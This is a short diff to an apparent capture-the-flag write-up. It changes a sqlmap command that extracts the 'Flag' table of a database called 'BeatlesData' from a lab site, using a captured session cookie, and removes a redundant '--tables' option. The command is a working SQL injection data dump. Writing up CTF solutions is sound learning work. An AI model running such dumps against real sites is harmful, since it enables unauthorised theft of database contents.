@@ -43,7 +43,7 @@ sqlmap -u "http://r2d2.hackingarena.com:1819/index.php" --cookie="PHPSESSID=4h84
 Lastly, we extract the data from database "BeatlesData" and table "Flag" to be dumped in our CLI.
 
 ```
-sqlmap -u "http://r2d2.hackingarena.com:1819/index.php" --cookie="PHPSESSID=4h84k6rantkj5olieg85ui31q5" --forms -D BeatlesData -T Flag --tables --dump
+sqlmap -u "http://r2d2.hackingarena.com:1819/index.php" --cookie="PHPSESSID=4h84k6rantkj5olieg85ui31q5" --forms -D BeatlesData -T Flag --dump
 ```
 
 ![[Pasted image 20241024160522.png]]
